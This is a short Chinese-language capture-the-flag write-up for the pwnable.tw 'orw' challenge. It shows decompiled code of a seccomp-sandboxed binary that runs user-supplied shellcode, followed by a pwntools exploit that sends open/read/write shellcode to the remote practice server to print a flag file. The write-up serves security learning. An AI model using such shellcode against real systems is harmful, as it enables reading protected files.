# orw

## ida

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}

unsigned int orw_seccomp()
{
  __int16 v1; // [esp+4h] [ebp-84h] BYREF
  char *v2; // [esp+8h] [ebp-80h]
  char v3[96]; // [esp+Ch] [ebp-7Ch] BYREF
  unsigned int v4; // [esp+6Ch] [ebp-1Ch]

  v4 = __readgsdword(0x14u);
  qmemcpy(v3, &unk_8048640, sizeof(v3));
  v1 = 12;
  v2 = v3;
  prctl(38, 1, 0, 0, 0);
  prctl(22, 2, &v1);
  return __readgsdword(0x14u) ^ v4;
}
```

这个题使用了沙箱`seccomp`用来限制系统调用。你只能使用`open`, `read`, `write`的系统调用。但是沙箱其实还有更复杂的机制，由于与本题的重点关系不大所以不再赘述。由于限制，我们的shellcode只能使用上述的三个函数。

## exp

```python
from pwn import *
#from LibcSearcher import LibcSearcher

leak = lambda name,addr: log.success('{:#x}'.format(name,addr))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./orw'
#gdb.attach(p)
if local:
        p=process(binary)
else:
        p=remote('chall.pwnable.tw',10001)

elf = ELF(binary,checksec=False)
#gdb.attach(p)
file_name = "/home/orw/flag"
shellcode = shellcraft.open(file_name)
shellcode += shellcraft.read('eax','esp', 100)
shellcode += shellcraft.write(1, 'esp', 100)
shellcode = asm(shellcode)
p.sendline(shellcode)

p.interactive()
```

我这里取巧了，其实它的目的是让你手写汇编代码。